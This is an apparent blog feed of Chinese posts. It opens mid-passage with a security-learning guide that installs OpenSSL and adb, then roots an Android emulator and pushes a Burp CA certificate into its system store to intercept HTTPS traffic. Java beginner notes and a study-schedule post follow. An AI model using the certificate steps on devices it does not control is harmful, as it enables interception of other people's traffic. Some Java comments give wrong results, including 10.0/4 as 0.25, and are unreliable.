title="下载安装OpenSSL及adb"></a>下载安装OpenSSL及adb</h3><p>下面就是很重要的OpenSSL安装及adb的安装了<br><span style="color:red"><br><strong>注意！我们安装的目的是在cmd（黑窗口）下面直接访问对应的功能。</strong><br></span></p><p>其实安装很简单，如下：<br>打开官方网址<a href="http://slproweb.com/products/Win32OpenSSL.html">http://slproweb.com/products/Win32OpenSSL.html</a><br>然后滑动到下方，选择适合自己的版本，这里选择exe x86的：<br><img src="sec_05.png" alt="&quot;下载地址&quot;"></p><p>具体的安装步骤和寻常exe差不多，自己看着安装就好。<br>下面安装adb的，因为模拟器一般自带adb，我们去模拟器的根目录下面挖一个就好了。<br>具体步骤如下图<br><img src="sec_07.png" alt="&quot;找到目录&quot;"><br><img src="sec_06.png" alt="&quot;文件复制&quot;"></p><h3 id="安装手机模拟器的证书"><a href="#安装手机模拟器的证书" class="headerlink" title="安装手机模拟器的证书"></a>安装手机模拟器的证书</h3><p>下面就需要进行cmd的配置了</p><p>在含有证书的目录下输入下面的命令（注意下文件名，别出错了）</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform der -<span class="keyword">in</span> cacert.der -out burp.pem</span><br></pre></td></tr></table></figure><p>证书的文件目录下会生成出一个文件，最终是这样的两个文件:</p><p><img src="sec_09.png" alt="&quot;文件&quot;"></p><p>直接打开逍遥模拟器的目录，在地址栏输入cmd打开黑窗口（保险），输入下面的adb命令</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">// 链接逍遥模拟器的端口</span><br><span class="line">adb connect <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">21503</span></span><br><span class="line">// 确认是否开启root</span><br><span class="line">adb root</span><br><span class="line">// 开启写入模式</span><br><span class="line">adb remount</span><br></pre></td></tr></table></figure><p>打开之前那个转换证书的地方的黑窗口，输入下面的命令，会得到一串字符串，去除首字符串后，将burp.pem文件名字重命名为9a5ba575.0后，调入逍遥模拟器的文件夹内</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">openssl x509 -subject_hash_old -<span class="keyword">in</span> burp.pem</span><br></pre></td></tr></table></figure><p><img src="sec_08.png" alt="&quot;文件&quot;"><br><img src="sec_10.png" alt="&quot;文件&quot;"></p><!-- [""](sec0.png) --><p>将证书传送到模拟器跟目录当中：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">adb push <span class="number">9</span>a5ba575.<span class="number">0</span> /system/etc/security/cacerts/</span><br></pre></td></tr></table></figure><p>实现的效果:<br><img src="sec_11.png" alt="&quot;传入证书&quot;"><br><img src="sec_12.png" alt="&quot;传入证书&quot;"></p><p>完成证书的导入后，可以开始对逍遥手机模拟器进行抓包了。<br>具体抓包只需要点击下面的按钮即可抓包<br><img src="sec_13.png" alt="&quot;传入证书&quot;"></p><p>关于OpenSSL的详细教程可参考：<a href="https://blog.csdn.net/qq_40321119/article/details/103329313">https://blog.csdn.net/qq_40321119/article/details/103329313</a><br>关于adb的详细教程可参考：<br><a href="https://blog.csdn.net/weixin_43927138/article/details/90477966">https://blog.csdn.net/weixin_43927138/article/details/90477966</a><br><a href="https://blog.csdn.net/weixin_55018452/article/details/121992202">https://blog.csdn.net/weixin_55018452/article/details/121992202</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-基础入门-01 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-06</title>
      <link href="/2023/02/04/java-study-06/"/>
      <url>/2023/02/04/java-study-06/</url>
      
        <content type="html"><![CDATA[<h1 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h1><h2 id="顺序控制"><a href="#顺序控制" class="headerlink" title="顺序控制"></a>顺序控制</h2><p>其实就是从上到下的顺序执行，没啥好讲的。</p><h2 id="分支控制"><a href="#分支控制" class="headerlink" title="分支控制"></a>分支控制</h2><p>分支语句有那么几类：<strong>单分支</strong> / <strong>双分支</strong> / <strong>多分支</strong><br>分支控制的语句也有那么几类：<strong>if-else</strong> / <strong>switch</strong><br>当然，if-else是可以叠加的。</p><span id="more"></span><h3 id="单分支结构"><a href="#单分支结构" class="headerlink" title="单分支结构"></a>单分支结构</h3><p>形如如下的结构：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式) &#123;</span><br><span class="line">    执行代码块（单/多语句）；</span><br><span class="line">&#125;</span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a&gt;<span class="number">1</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>说明：<br><strong>1</strong>.条件为true执行代码块，false不执行。<br><strong>2</strong>.单条执行代码时可以不用写{}（格式问题，最好写上吧）</p></blockquote><!-- ![and one](f01.png) --><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f01.png?raw=true" alt="and one"></p><h3 id="双分支结构"><a href="#双分支结构" class="headerlink" title="双分支结构"></a>双分支结构</h3><p>与单分支相比，多了一个 <strong>else</strong><br>形如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件语句)&#123;</span><br><span class="line">    执行代码块<span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    执行代码块<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello China!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>说明：和单分支结构略有不同<br><strong>1</strong>.条件表达式为 <span style="color:red;font-size:20">true:</span> 执行代码块1<br><strong>2</strong>.条件表达式为 <span style="color:red;font-size:20">false:</span> 执行代码块2</p></blockquote><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f02.png?raw=true" alt="and two"></p><h3 id="多分支-嵌套分支（建议不要超过3层）"><a href="#多分支-嵌套分支（建议不要超过3层）" class="headerlink" title="多分支/嵌套分支（建议不要超过3层）"></a>多分支/嵌套分支（建议不要超过3层）</h3><p>多分支，结构和双分支差不多，也就叠加了几个if-else而已<br>形如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件语句<span class="number">1</span>)&#123;</span><br><span class="line">    执行代码块<span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件语句<span class="number">2</span>)&#123;</span><br><span class="line">    执行代码块<span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    执行代码块<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a&lt;<span class="number">1</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (a&gt;<span class="number">1</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello Guangdong!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello China!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br><strong>1</strong>.分别进行条件判断，哪个成立执行哪个<br><strong>2</strong>.有执行则表示有执行入口，没执行表示没执行入口<br><strong>3</strong>.如果全不成立执行且末尾有 <span style="color:red"><strong>else</strong></span>，执行else</p></blockquote><p>上面都是关于if语句的分支语句，下面来看个和if有些相似的判断：<span style="color:red"><strong>switch语句</strong></span></p><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f03.png?raw=true" alt="and three"></p><h3 id="switch判断语句"><a href="#switch判断语句" class="headerlink" title="switch判断语句"></a>switch判断语句</h3><p>结构如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 常量<span class="number">1</span>:</span><br><span class="line">    语句块<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 常量<span class="number">2</span>:</span><br><span class="line">    语句块<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> 常量n:</span><br><span class="line">    语句块n;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    defaulet语句块;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>说明<br><strong>1</strong>. 常量是确定的，不是范围<br><strong>2</strong>.case成立后，语句块。<br><strong>3</strong>.如果没有break分层，会导致从当下的语句块开始执行到有break的语句块去。（穿透）<br><strong>4</strong>.break：退出当前case+switch<br><strong>5</strong>.前面的case无法匹配时使用default语句<br><strong>6</strong>.default语句可用可不用<br><strong>7</strong>.表达式的返回值必须是<br><strong>8</strong>.表达式的返回值必须是：byte,short,int,char,enum【枚举】,String</p></blockquote><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f04.png?raw=true" alt="switch two"></p><h4 id="switch穿透思想"><a href="#switch穿透思想" class="headerlink" title="switch穿透思想"></a>switch穿透思想</h4><p>基于switch没有break就会不断向下执行，直到遇到break时退出的这点，switch分支还真的能判断一定的具体值。<br>下面举个例子看看就知道了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">myScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入1~12进行月份所属季节判断：&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">month</span> <span class="operator">=</span> myScanner.nextInt();</span><br><span class="line">        <span class="keyword">switch</span> (month) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;冬季&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;春季&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;夏季&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;秋季&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;月份输错啦！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f05.png?raw=true" alt="switch one"></p><h3 id="if和switch的比较"><a href="#if和switch的比较" class="headerlink" title="if和switch的比较"></a>if和switch的比较</h3><blockquote><p><strong>1.</strong> 数值不多，符合byte,short,int,char,enum【枚举】,String的类型，推荐 switch。<br><strong>2.</strong> 其他情况：区间判断、类型判断等 =&gt; 推荐if</p></blockquote><h2 id="循环控制★★★"><a href="#循环控制★★★" class="headerlink" title="循环控制★★★"></a>循环控制★★★</h2><p>循环控制有很多，有：<strong>for / while / while / do…while / 多重循环</strong></p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(循环变量初始化;循环条件;循环变量迭代)&#123;</span><br><span class="line">    循环操作语句;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br><strong>1</strong>.执行顺序：先执行变量初始化，后以“循环条件=&gt;循环操作语句=&gt;循环变量迭代=&gt;循环条件……”进行多次循环，直到不满足 <strong>“循环条件”</strong> 或者遇到跳转控制时退出循环。<br><strong>2</strong>.循环条件：返回布尔值 <strong>（true/false）</strong><br><strong>3</strong>.初始化语句：可以多句，类型相同，逗号分隔<br><strong>4</strong>.死循环：<strong>for(;;){语句块}</strong> =&gt; <strong>“;”</strong> 不能省略</p></blockquote><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f06.png?raw=true" alt="main"></p><h3 id="while循环与do…while"><a href="#while循环与do…while" class="headerlink" title="while循环与do…while"></a>while循环与do…while</h3><p>格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.while</span></span><br><span class="line">循环变量初始化;</span><br><span class="line"><span class="keyword">while</span>(循环条件) &#123;</span><br><span class="line">    循环体;</span><br><span class="line">    循环变量迭代;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span>..<span class="keyword">while</span>初始化</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.do...while</span></span><br><span class="line">循环变量初始化;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">   循环体;</span><br><span class="line">   循环迭代变量;</span><br><span class="line">&#125;<span class="keyword">while</span>(循环条件);</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br><strong>while:</strong><br>1.循环条件返回布尔值<br>2.先判断再执行<br><strong>do…while:</strong><br>先执行，在判断，少一次</p></blockquote><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f07.png?raw=true" alt="while one"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java-study-06/f08.png?raw=true" alt="while two"></p><h2 id="跳转控制"><a href="#跳转控制" class="headerlink" title="跳转控制"></a>跳转控制</h2><h3 id="break-continue-return"><a href="#break-continue-return" class="headerlink" title="break/continue/return"></a>break/continue/return</h3><p>这部分简单描述下：<br>    break：退出当前循环<br>    continue:跳过当前循环<br>    return：结束当前方法</p><h3 id="提一嘴：指定label退出循环"><a href="#提一嘴：指定label退出循环" class="headerlink" title="提一嘴：指定label退出循环"></a>提一嘴：指定label退出循环</h3><p>在多层循环嵌套的情况下，给每一层指定label，并且在break/continue时将其用上，就能退出指定的循环。结构看下面：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">label1: </span><br><span class="line"><span class="keyword">for</span>(xxx)&#123;</span><br><span class="line">    ....</span><br><span class="line">    label2: </span><br><span class="line">    <span class="keyword">for</span>(xxxx)&#123;</span><br><span class="line">        ....</span><br><span class="line">        label3:</span><br><span class="line">        <span class="keyword">for</span>(xxx)&#123;</span><br><span class="line">            ....</span><br><span class="line">            <span class="comment">// 表示就当循环达到条件时，退出label2循环</span></span><br><span class="line">            <span class="keyword">break</span> label2;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br><strong>1</strong>.默认退出最近的循环<br><strong>2</strong>.实际开发千万不要用label（标签会降低可读性，不到迫不得已千万不要用）</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加急通知</title>
      <link href="/2023/01/31/urgent-notification/"/>
      <url>/2023/01/31/urgent-notification/</url>
      
        <content type="html"><![CDATA[<h1 id="加急通知"><a href="#加急通知" class="headerlink" title="加急通知"></a>加急通知</h1><h2 id="起因：朋友圈"><a href="#起因：朋友圈" class="headerlink" title="起因：朋友圈"></a>起因：朋友圈</h2><p>熬夜时刚好码完日志，去看了眼朋友圈啥时被吓了一跳： <strong>2月13开学！</strong><br>原本以为会托到2月18，还是我太低估这学校了。那意味着……学习任务必须加重了！</p><h2 id="接下来的安排"><a href="#接下来的安排" class="headerlink" title="接下来的安排"></a>接下来的安排</h2><p>接下来的活计真的就得翻倍了……</p><span id="more"></span><p>首先，java学习以及写日志继续。<br>其次，再加上安全课程学习（两种课程叠一起）。<br>也就是说，可能不能再帮家里分担家务了，要……加班加点的学习了……</p><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>早上</td><td>java学习</td></tr><tr><td>下午</td><td>学习安全</td></tr><tr><td>晚上</td><td>学习java，辅学php，如果学烦了直接学安全</td></tr></tbody></table><p>直觉:两语言不能一起学（又得放php鸽子了……）<br>后悔的是，当时学一半js就跑回去补了html，浪费了太多时间，项目也只是做了前端的项目，具体请前去一个特殊的网址查看，我发布的。<br><a href="http://sywcsdnsec.3vhost.club/pyg/">品优购项目完成网址</a><br>总结：品优购的项目是真的费时……<br>学到后面移动端时就跑路了，时间容不得我浪费。</p><h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>人算不如董算啊……<br>加油吧……</p>]]></content>
      
      
      <categories>
          
          <category> 方向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安排 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-05</title>
      <link href="/2023/01/30/java-study-05/"/>
      <url>/2023/01/30/java-study-05/</url>
      
        <content type="html"><![CDATA[<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><table><thead><tr><th>最高优先级</th></tr></thead><tbody><tr><td>.  () {} ; ,</td></tr><tr><td>++ – ~ !(data type)</td></tr><tr><td>*/ %</td></tr><tr><td>&lt;&lt; &gt;&gt; &gt;&gt;&gt; 位移</td></tr><tr><td>&lt; &gt; &lt;= &gt;= instanceof</td></tr><tr><td>== !=</td></tr><tr><td>&amp;</td></tr><tr><td>^</td></tr><tr><td>|</td></tr><tr><td>&amp;&amp;</td></tr><tr><td>||</td></tr><tr><td>? :</td></tr><tr><td>=*= /= %=</td></tr><tr><td>+= -= &lt;&lt;= &gt;&gt;=</td></tr><tr><td>&gt;&gt;&gt;= &amp;= ^=</td></tr><tr><td>最低优先级</td></tr></tbody></table><span id="more"></span><h3 id="大致分类"><a href="#大致分类" class="headerlink" title="大致分类"></a>大致分类</h3><blockquote><ol><li>(),{}</li><li>单目运算    ++ --</li><li>算数运算符  +-*/%</li><li>位移运算符  &gt;&gt;  &gt;&gt;&gt;  &lt;&lt;</li><li>比较运算符  (关系运算符) == != &lt;  &gt;  &lt;=  &gt;=</li><li>逻辑运算符  &amp;&amp; &amp; || | ! ~ ^</li><li>三元运算符  条件a ? 语句1 : 语句2</li><li>赋值运算符  = += -= *= /= %=</li></ol></blockquote><h4 id="除法-取模"><a href="#除法-取模" class="headerlink" title="除法/ 取模%"></a>除法/ 取模%</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 双整数必然得到整数</span></span><br><span class="line">        System.out.println(<span class="number">20</span>/<span class="number">3</span>);   <span class="comment">// 6</span></span><br><span class="line">        <span class="comment">// 带有一个浮点数则实现除法的结果带上浮点数</span></span><br><span class="line">        System.out.println(<span class="number">10.0</span>/<span class="number">4</span>); <span class="comment">// 0.25</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取模%</span></span><br><span class="line">        <span class="comment">// 本质的公式：a%b = a -(a/b)*b</span></span><br><span class="line">        System.out.println(<span class="number">3</span>%<span class="number">2</span>); <span class="comment">// 1</span></span><br><span class="line">        System.out.println(-<span class="number">3</span>%<span class="number">2</span>); <span class="comment">// -1</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">/*检测是否类的对象(关系运算符)*/</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;hsp&quot;</span> <span class="keyword">instanceof</span> String;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><h5 id="各逻辑运算符介绍"><a href="#各逻辑运算符介绍" class="headerlink" title="各逻辑运算符介绍"></a>各逻辑运算符介绍</h5><table><thead><tr><th>符号</th><th>名称</th><th>阐释(个人版)</th></tr></thead><tbody><tr><td>&amp;</td><td>算数与</td><td>两边为true时为true，且无论结果如何，将所有的条件执行一遍</td></tr><tr><td>&amp;&amp;</td><td>逻辑与</td><td>同true为true，当左边为false时立即停止判断</td></tr><tr><td>|</td><td>算数或</td><td>有一边为true时为true，且执行判断完所有的条件</td></tr><tr><td>||</td><td>逻辑或</td><td>有一个为true时为true，且左边为true时中断执行</td></tr><tr><td>!和~</td><td>非</td><td>反转结果，true转false，false转true</td></tr><tr><td>^</td><td>异或</td><td>和“&amp;”相反，true和false同时出现时为true，否则为false</td></tr></tbody></table><h5 id="短路运算符与逻辑运算符的区别"><a href="#短路运算符与逻辑运算符的区别" class="headerlink" title="短路运算符与逻辑运算符的区别"></a>短路运算符与逻辑运算符的区别</h5><blockquote><p>1.短路运算符执行一旦达到条件立即中断。<br>2.逻辑运算符无论条件是否满足，全部的条件都执行一遍。<br>3.短路运算符较为常用。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 举个例子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span>&gt;b++&amp;&amp;c++ &gt;<span class="number">3</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;通过！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(b); </span><br><span class="line">        System.out.println(c); </span><br><span class="line">        <span class="comment">// 第一个条件不通过，但已经判断到了第一个条件，且为短路运算符，所以 b=2,c=3</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span>&gt;b++&amp;c++ &gt;<span class="number">3</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;通过！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(b); </span><br><span class="line">        System.out.println(c); </span><br><span class="line">        <span class="comment">// 第一个条件不通过，但为逻辑运算符，所以执行完所有的条件语句，结果为： b=3,c=4</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>语法格式为：<strong>条件语句 ? 执行语句1:执行语句2</strong><br>当条件语句为true时，语句1执行；反之执行语句2<br>举个例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span><span class="number">30</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> x &gt; <span class="number">1</span> ? <span class="number">1234</span> : <span class="number">3456</span>;</span><br><span class="line">        <span class="comment">// 很显然，x大于1，所以d的值为1234.</span></span><br><span class="line">        System.out.println(d); <span class="comment">// 1234</span></span><br><span class="line">        <span class="comment">// 如果x小于1,3456就会赋给d</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p>指二进制层面的运算，具体看 <strong>java学习日志-02</strong> 的位运算。<br>（学完可以去《Minecraft》建造二进制计算机了，当然，除非你有那闲空）</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-04</title>
      <link href="/2023/01/29/java-study-04/"/>
      <url>/2023/01/29/java-study-04/</url>
      
        <content type="html"><![CDATA[<h1 id="Java数据类型★★★★"><a href="#Java数据类型★★★★" class="headerlink" title="Java数据类型★★★★"></a>Java数据类型★★★★</h1><p>数据类型很重要，这是基础中的基础。<br><a href="https://www.matools.com/api">在线API文档点我</a><br>包-&gt; 类 –&gt; 方法</p><span id="more"></span><h2 id="8大基本数据类型表"><a href="#8大基本数据类型表" class="headerlink" title="8大基本数据类型表"></a>8大基本数据类型表</h2><p><strong>1字节=8bit</strong></p><table><thead><tr><th>类型</th><th>名称</th><th>范围</th><th>字节</th><th>概念</th><th>封装类</th></tr></thead><tbody><tr><td>byte</td><td>字节</td><td>-128~127</td><td>1</td><td>byte 类型用在大型数组中节约空间，主要代替整数</td><td>Byte</td></tr><tr><td>short</td><td>短整型</td><td>-(2^15)~(2^15-1)</td><td>2</td><td>Short 数据类型也可以像 byte 那样节省空间</td><td>Short</td></tr><tr><td>int</td><td>整数类型</td><td>-(2^31)~(2^31-1)</td><td>4</td><td>一般地整型变量默认为 int 类型</td><td>Integer</td></tr><tr><td>long</td><td>长整型</td><td>-(2^63)~(2^63-1)</td><td>8</td><td>主要使用在需要比较大整数的系统上</td><td>Long</td></tr><tr><td>-</td><td>-</td><td>-</td><td>上面是整型</td><td>-</td><td></td></tr><tr><td>float</td><td>单精度浮点数</td><td>-3.403E38~3.403E38</td><td>4</td><td>单精度、32位、符合IEEE 754标准的浮点数</td><td>Float</td></tr><tr><td>double</td><td>双精度浮点数</td><td>-1.798E308~1.798E308</td><td>8</td><td>双精度、64 位、符合 IEEE 754 标准的浮点数</td><td>Double</td></tr><tr><td>-</td><td>-</td><td>-</td><td>上面是浮点型</td><td>-</td><td></td></tr><tr><td>char</td><td>字符类型</td><td></td><td>2</td><td>存放单个字符’a’</td><td>Character</td></tr><tr><td>boolean</td><td>布尔型</td><td></td><td>1或4</td><td>存放trun/false</td><td>Boolean</td></tr></tbody></table><h3 id="浮点型使用细节"><a href="#浮点型使用细节" class="headerlink" title="浮点型使用细节"></a>浮点型使用细节</h3><blockquote><p><strong>1.</strong> 浮点数=符号位+指数位+尾部位(可能丢尾，导致失精)<br><strong>2.</strong> 占字节越大越精确，推荐使用double<br><strong>3.</strong> 浮点数陷阱：最好不要使用浮点数进行数据的比较</p></blockquote><h3 id="字符类型使用细节-char"><a href="#字符类型使用细节-char" class="headerlink" title="字符类型使用细节(char)"></a>字符类型使用细节(char)</h3><blockquote><p><strong>1.</strong> 使用单引号,允许使用转义字符‘\’的特殊字符<br><strong>2.</strong> 本质为整数，输出时为Unicode码 <a href="http://tool.chinaz.com/Tools/Unicode.aspx">编译Unicode的网址点我</a><br><strong>3.</strong> char赋值整数，输出时为对应的Unicode码<br><strong>4.</strong> 可以用来参与运算</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">char</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">97</span>;</span><br><span class="line">       System.out.println(x); <span class="comment">// 输出字符a</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)x); <span class="comment">// 输出字符a对应的数字98</span></span><br><span class="line">       System.out.println(x+<span class="number">1</span>); <span class="comment">// 输出为98(运算结果)</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="布尔类型使用细节"><a href="#布尔类型使用细节" 